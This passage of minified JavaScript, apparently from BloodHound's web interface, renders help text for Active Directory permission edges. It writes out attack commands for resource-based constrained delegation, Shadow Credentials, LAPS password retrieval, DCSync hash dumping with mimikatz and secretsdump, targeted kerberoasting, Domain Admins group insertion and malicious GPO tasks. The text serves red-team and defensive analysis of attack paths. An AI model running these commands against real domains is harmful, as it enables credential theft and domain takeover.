abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege, use"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Computer":return c?e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:" Retrieve LAPS Password "}),e.jsx(t,{variant:"body2",children:"Full control of a computer object is abusable when the computer's local admin account credential is controlled with LAPS. The clear-text password for the local administrator account is stored in an extended attribute on the computer object called ms-Mcs-AdmPwd. With full control of the computer object, you may have the ability to read this attribute, or grant yourself the ability to read the attribute by modifying the computer object's security descriptor."}),e.jsxs(t,{variant:"body2",children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/p0dalirius/pyLAPS",children:"pyLAPS"})," ","can be used to retrieve LAPS passwords:"]}),e.jsx(t,{component:"pre",children:'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'}),e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation "}),"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:",e.jsx(t,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:",e.jsx(t,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),`And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`,e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER.",e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege, use"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]}):e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation "}),"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:",e.jsx(t,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:",e.jsx(t,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),`And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`,e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER.",e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege, use"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Domain":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:" DCSync "}),e.jsxs(t,{variant:"body2",children:["The AllExtendedRights privilege grants ",n," both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges, which combined allow a principal to replicate objects from the domain ",a,"."]}),e.jsx(t,{variant:"body2",children:"This can be abused using Impacket's secretsdump.py example script:"}),e.jsx(t,{component:"pre",children:"secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'"}),e.jsx(t,{variant:"body1",children:" Retrieve LAPS Passwords "}),e.jsxs(t,{variant:"body2",children:["The AllExtendedRights privilege also grants ",n," enough privileges, to retrieve LAPS passwords domain-wise."]}),e.jsxs(t,{variant:"body2",children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/p0dalirius/pyLAPS",children:"pyLAPS"})," ","can be used for that purpose:"]}),e.jsx(t,{component:"pre",children:'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'})]});case"GPO":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."}),e.jsxs(t,{variant:"body2",children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/Hackndo/pyGPOAbuse",children:"pyGPOAbuse.py"})," ","can be used for that purpose."]})]});case"OU":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Control of the Organization Unit"}),e.jsx(t,{variant:"body2",children:"With full control of the OU, you may add a new ACE on the OU that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step:"}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:`The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'OUDistinguishedName' 'domain'/'user':'password'"}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:"If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this."})]});case"Container":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Control of the Container"}),e.jsx(t,{variant:"body2",children:"With full control of the container, you may add a new ACE on the container that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step:"}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:`The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'containerDistinguishedName' 'domain'/'user':'password'"}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:"If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this."})]})}return e.jsx(e.Fragment,{})},uc=()=>e.jsx(t,{variant:"body2",children:"This depends on the target object and how to take advantage of this privilege. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki."}),mc=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://adsecurity.org/?p=1729",children:"https://adsecurity.org/?p=1729"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/activedirectory/targeted-kerberoasting/",children:"https://blog.harmj0y.net/activedirectory/targeted-kerberoasting/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e",children:"https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff",children:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/addmember",children:"https://www.thehacker.recipes/ad/movement/dacl/addmember"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting",children:"https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/group-policies",children:"https://www.thehacker.recipes/ad/movement/group-policies"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword",children:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials",children:"https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync",children:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd",children:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/grant-rights",children:"https://www.thehacker.recipes/ad/movement/dacl/grant-rights"})]}),bc={general:lc,windowsAbuse:hc,linuxAbuse:pc,opsec:uc,references:mc},gc=({sourceName:n,sourceType:r,targetName:a,targetType:s})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[k(r,n)," generic write access to the ",I(s)," ",a,"."]}),e.jsx(t,{variant:"body2",children:'Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user'})]}),yc=({sourceName:n,sourceType:r,targetType:a})=>{switch(a){case"Group":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"GenericWrite to a group allows you to directly modify group membership of the group."}),e.jsx(t,{variant:"body2",children:'There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).'}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:"}),e.jsx(t,{component:"pre",children:"Get-DomainGroupMember -Identity 'Domain Admins'"})]});case"User":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with Get-DomainSPNTicket."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"}),e.jsx(t,{variant:"body2",children:"After running this, you can use Get-DomainSPNTicket as follows:"}),e.jsx(t,{component:"pre",children:"Get-DomainSPNTicket -Credential $Cred harmj0y | fl"}),e.jsx(t,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:"}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname"})]});case"GPO":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"With GenericWrite on a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."}),e.jsx(t,{variant:"body2",children:"This edge can be a false positive in rare scenarios. If you have GenericWrite on the GPO with 'This object only' (no inheritance) and no other permissions in the ACL, it is not possible to add or modify settings of the GPO. The GPO's settings are stored in SYSVOL under a folder for the given GPO. Therefore, you need write access to child objects of this folder or create child objects permission. The security descriptor of the GPO is reflected on the folder, meaning permissions to write child items on the GPO are required."})]});case"Computer":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Generic write to a computer object can be used to perform a resource based constrained delegation attack."}),e.jsx(t,{variant:"body2",children:"Abusing this primitive is currently only possible through the Rubeus project."}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),e.jsx(t,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),e.jsx(t,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),e.jsx(t,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),e.jsx(t,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),e.jsx(t,{component:"pre",children:`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)`}),e.jsx(t,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:"}),e.jsx(t,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),e.jsx(t,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),e.jsx(t,{variant:"body2",children:`And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:`}),e.jsx(t,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"})]});default:return null}},fc=({sourceName:n,sourceType:r,targetType:a})=>{switch(a){case"Group":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"GenericWrite to a group allows you to directly modify group membership of the group."}),e.jsx(t,{variant:"body2",children:"Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:"}),e.jsx(t,{component:"pre",children:'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["Pass-the-hash can also be done here with"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replaced with"," ",e.jsx(t,{component:"pre",children:" ffffffffffffffffffffffffffffffff"}),"."]}),e.jsx(t,{component:"pre",children:'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group:"}),e.jsx(t,{component:"pre",children:'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'})]});case"User":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:" Targeted Kerberoast "}),e.jsxs(t,{variant:"body2",children:["A targeted kerberoast attack can be performed using"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/targetedKerberoast",children:"targetedKerberoast.py"}),"."]}),e.jsx(t,{component:"pre",children:"targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"}),e.jsx(t,{variant:"body2",children:"The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well."}),e.jsx(t,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege, use"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Computer":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation "}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),e.jsx(t,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),e.jsx(t,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:`And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`}),e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),e.jsx(t,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege, use"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"GPO":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"With GenericWrite over a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."}),e.jsxs(t,{variant:"body2",children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/Hackndo/pyGPOAbuse",children:"pyGPOAbuse.py"})," ","can be used for that purpose."]}),e.jsx(t,{variant:"body2",children:"This edge can be a false positive in rare scenarios. If you have GenericWrite on the GPO with 'This object only' (no inheritance) and no other permissions in the ACL, it is not possible to add or modify settings of the GPO. The GPO's settings are stored in SYSVOL under a folder for the given GPO. Therefore, you need write access to child objects of this folder or create child objects permission. The security descriptor of the GPO is reflected on the folder, meaning permissions to write child items on the GPO are required."})]});default:return null}},wc=()=>e.jsx(t,{variant:"body2",children:"This depends on the target object and how to take advantage of this privilege. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki."}),xc=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/activedirectory/targeted-kerberoasting/",children:"https://blog.harmj0y.net/activedirectory/targeted-kerberoasting/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff",children:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"})]}),jc={general:gc,windowsAbuse:yc,linuxAbuse:fc,opsec:wc,references:xc},vc=({sourceName:n,sourceType:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[k(r,n)," the DS-Replication-Get-Changes privilege on the domain"," ",a,"."]}),e.jsx(t,{variant:"body2",children:"Individually, this edge does not grant the ability to perform an attack. However, in conjunction with DS-Replication-Get-Changes-All, a principal may perform a DCSync attack."})]}),Ac=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:"}),e.jsx(t,{component:"pre",children:"lsadump::dcsync /domain:testlab.local /user:Administrator"}),e.jsx(t,{variant:"body2",children:"You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."})]}),Sc=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket's secretsdump.py example script:"}),e.jsx(t,{component:"pre",children:"secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'"}),e.jsx(t,{variant:"body2",children:"You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."})]}),kc=()=>e.jsx(t,{variant:"body2",children:"For detailed information on detection of dcsync as well as opsec considerations, see the adsecurity post in the references tab."}),Tc=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://adsecurity.org/?p=1729",children:"https://adsecurity.org/?p=1729"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/",children:"https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync",children:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"})]}),Pc={general:vc,windowsAbuse:Ac,linuxAbuse:Sc,opsec:kc,references:Tc},Cc=({sourceName:n,sourceType:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[k(r,n)," the DS-Replication-Get-Changes-All privilege on the domain"," ",a,"."]}),e.jsx(t,{variant:"body2",children:"Individually, this edge does not grant the ability to perform an attack. However, in conjunction with DS-Replication-Get-Changes, a principal may perform a DCSync attack."})]}),Dc=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:"}),e.jsx(t,{component:"pre",children:"lsadump::dcsync /domain:testlab.local /user:Administrator"}),e.jsx(t,{variant:"body2",children:"You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."})]}),Rc=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket's secretsdump.py example script:"}),e.jsx(t,{component:"pre",children:"secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'"}),e.jsx(t,{variant:"body2",children:"You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."})]}),Oc=()=>e.jsx(t,{variant:"body2",children:"For detailed information on detection of dcsync as well as opsec considerations, see the adsecurity post in the references 